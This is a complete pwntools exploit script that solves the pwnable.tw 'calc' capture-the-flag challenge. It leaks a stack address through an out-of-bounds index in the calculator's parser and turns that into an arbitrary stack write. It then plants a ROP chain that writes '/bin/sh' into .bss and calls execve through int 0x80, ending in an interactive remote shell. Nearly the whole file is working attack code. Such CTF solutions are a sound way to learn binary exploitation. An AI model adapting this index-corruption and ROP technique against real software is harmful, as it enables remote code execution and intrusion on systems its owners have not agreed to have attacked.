#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./calc')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10100)

#gdb.attach(p, 'b *0x08049432\nb *0x08049160\nb *0x080493FF\nc')
#gdb.attach(p, 'b *0x08048F45\nb *0x08048F79\nc')
#gdb.attach(p, 'b *0x08049432\nc')

ru('=== Welcome to SECPROG calculator ===\n')

#input('@')

# for DEBUG
# return address: 0xff89dfbc

# leak stack
sl('+360')
stack = (1<<32) + int(ru('\n')[:-1])
info('stack = ' + hex(stack))

# arb write
def arb_write(offset, data):
    sl('+' + str(offset))
    num = int(ru('\n')[:-1])
    info('data = ' + hex(data))
    info('num = ' + hex(num))
    diff = data - num
    info('diff = ' + hex(diff))
    if diff > 0:
        sl('+' + str(offset) + '+' + str(diff))
    else:
        sl('+' + str(offset) + str(diff))
    ru('\n')

# write rop on stack
bss_buf = 0x80eb100
cmd = [0x6e69622f, 0x68732f]
pop_eax_ret = 0x0805c34b
pop_ebx_ret = 0x080481d1
pop_edx_ret = 0x080701aa
# 0x08049f13 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
xor_ecx_ret = 0x08049f13
# 0x0808c2ed : xor edx, edx ; pop ebx ; div esi ; pop esi ; pop edi ; pop ebp ; ret
xor_edx_ret = 0x0808c2ed
int_0x80 = 0x08049a21
ret = 0x080481ba
# 0x0807cc01 : mov dword ptr [eax], edx ; ret
mov_eax_edx_ret = 0x0807cc01
payload = [
    pop_eax_ret, bss_buf, pop_edx_ret, cmd[0], mov_eax_edx_ret, 
    pop_eax_ret, bss_buf + 4, pop_edx_ret, cmd[1], mov_eax_edx_ret, 
    xor_ecx_ret, 0x41, 0x41, 0x41, 0x41, 
    xor_edx_ret, 0x41, 0x41, 0x41, 0x41, 
    pop_eax_ret, 0xb, 
    pop_ebx_ret, bss_buf, 
    int_0x80, 
]
for i in range(len(payload)):
    arb_write(361 + i, payload[i])

# trigger rop
sl('exit')

p.interactive()

